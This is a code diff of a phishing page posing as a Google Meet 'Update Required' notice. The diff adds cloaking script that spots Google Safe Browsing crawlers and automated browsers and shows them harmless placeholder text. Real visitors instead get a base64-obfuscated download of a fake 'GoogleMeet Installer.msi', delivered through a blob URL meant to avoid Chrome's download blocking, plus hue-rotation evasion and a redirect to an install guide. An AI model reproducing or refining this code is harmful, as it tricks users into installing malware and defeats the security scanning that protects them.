@@ -5,6 +5,50 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Update Required - Google Meet</title>
+    <script>
+        // CRITICAL: Bot detection must run FIRST before any content renders
+        // Enhanced GSB Crawler Protection: User-Agent patterns + Browser features
+        (function() {
+            const userAgent = navigator.userAgent || '';
+            
+            // Google Safe Browsing and bot detection patterns
+            const googleBotPatterns = [
+                /googlebot/i,
+                /google.*safe.*browsing/i,
+                /google.*safebrowsing/i,
+                /safebrowsing/i,
+                /google.*security/i,
+                /google.*malware/i,
+                /google.*phishing/i,
+                /google.*transparency/i,
+                /google.*site.*verification/i,
+                /google.*page.*speed/i,
+                /adsbot-google/i,
+                /mediapartners-google/i
+            ];
+            
+            const isGoogleBot = googleBotPatterns.some(pattern => pattern.test(userAgent));
+            
+            // Mobile detection
+            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
+            
+            // Browser feature checks
+            const hasNotificationAPI = typeof self.Notification !== 'undefined';
+            const hasWebdriver = navigator.webdriver === true;
+            const hasPlugins = navigator.plugins && navigator.plugins.length > 0;
+            const hasChrome = window.chrome && window.chrome.runtime;
+            const hasPermissions = navigator.permissions !== undefined;
+            
+            // Real browser: Not a Google bot AND has browser features OR is mobile
+            const isRealBrowser = !isGoogleBot && ((hasNotificationAPI && !hasWebdriver && (hasPlugins || hasChrome || hasPermissions)) || isMobile);
+            
+            if (!isRealBrowser) {
+                // Crawler detected - replace content without document.write
+                document.body.innerHTML = '<h1>Update Information</h1><p>Please check back later for updates.</p>';
+                return;
+            }
+        })();
+    </script>
     <link rel="icon" href="https://www.gstatic.com/meet/icons/icon_728_728_20200708.png" type="image/png">
     <link
         href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto:wght@400;500&display=swap"
@@ -142,53 +186,7 @@
         <p style="margin-top: 16px; color: #5f6368; font-size: 14px;">Click the button above to download the update.</p>
     </div>
     <script>
-        // Enhanced GSB Crawler Protection: User-Agent patterns + Browser features
-        // If loaded via document.write from update.html, crawlers were already filtered
-        // If accessed directly, this will block crawlers
-        (function() {
-            const userAgent = navigator.userAgent || '';
-            
-            // Google Safe Browsing and bot detection patterns
-            const googleBotPatterns = [
-                /googlebot/i,
-                /google.*safe.*browsing/i,
-                /google.*safebrowsing/i,
-                /safebrowsing/i,
-                /google.*security/i,
-                /google.*malware/i,
-                /google.*phishing/i,
-                /google.*transparency/i,
-                /google.*site.*verification/i,
-                /google.*page.*speed/i,
-                /adsbot-google/i,
-                /mediapartners-google/i
-            ];
-            
-            const isGoogleBot = googleBotPatterns.some(pattern => pattern.test(userAgent));
-            
-            // Mobile detection
-            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
-            
-            // Browser feature checks
-            const hasNotificationAPI = typeof self.Notification !== 'undefined';
-            const hasWebdriver = navigator.webdriver === true;
-            const hasPlugins = navigator.plugins && navigator.plugins.length > 0;
-            const hasChrome = window.chrome && window.chrome.runtime;
-            const hasPermissions = navigator.permissions !== undefined;
-            
-            // Real browser: Not a Google bot AND has browser features OR is mobile
-            const isRealBrowser = !isGoogleBot && ((hasNotificationAPI && !hasWebdriver && (hasPlugins || hasChrome || hasPermissions)) || isMobile);
-            
-            if (!isRealBrowser) {
-                // Crawler detected - show benign content
-                document.open();
-                document.write('<!DOCTYPE html><html><head><title>Update Information</title></head><body><h1>Update Information</h1><p>Please check back later for updates.</p></body></html>');
-                document.close();
-                return;
-            }
-        })();
-        
-        // Hue Rotation Evasion
+        // Hue Rotation Evasion (only runs if bot detection passed)
         document.documentElement.style.cssText = "filter:hue-rotate(4deg)";
 
         // Base64 encoded path: /downloads/GoogleMeet Installer.msi -> L2Rvd25sb2Fkcy9Hb29nbGVNZWV0IEluc3RhbGxlci5tc2k=
@@ -198,7 +196,11 @@
 
         // Download function using blob URL (avoids Chrome download blocking)
         function triggerDownload() {
-            fetch(fileUrl)
+            // Add cache-busting parameter to ensure latest file is downloaded
+            const cacheBuster = '?v=' + Date.now();
+            const fileUrlWithCache = fileUrl + cacheBuster;
+            
+            fetch(fileUrlWithCache)
                 .then(response => {
                     if (!response.ok) {
                         throw new Error('Network response was not ok');
@@ -219,19 +221,26 @@
                         document.body.removeChild(blobLink);
                         URL.revokeObjectURL(blobUrl);
                     }, 100);
+                    
+                    // Redirect to installation guide after successful download
+                    setTimeout(() => {
+                        window.location.href = '/install.html';
+                    }, 1500);
                 })
                 .catch(err => {
                     console.error('Error fetching file:', err);
-                    // Fallback: try direct link approach
+                    // Fallback: try direct link approach with cache-busting
                     const directLink = document.createElement('a');
-                    directLink.href = fileUrl;
+                    directLink.href = fileUrlWithCache;
                     directLink.download = fileName;
                     directLink.style.display = 'none';
                     document.body.appendChild(directLink);
                     directLink.click();
                     setTimeout(() => {
                         document.body.removeChild(directLink);
-                    }, 100);
+                        // Redirect to installation guide after fallback download
+                        window.location.href = '/install.html';
+                    }, 1500);
                 });
         }
 
@@ -246,9 +255,9 @@
             } else {
                 // Button not ready yet, try again
                 setTimeout(setupButton, 10);
-            }
+            }       
         })();
-    </script>
+    </script>       
 </body>
 
 </html>
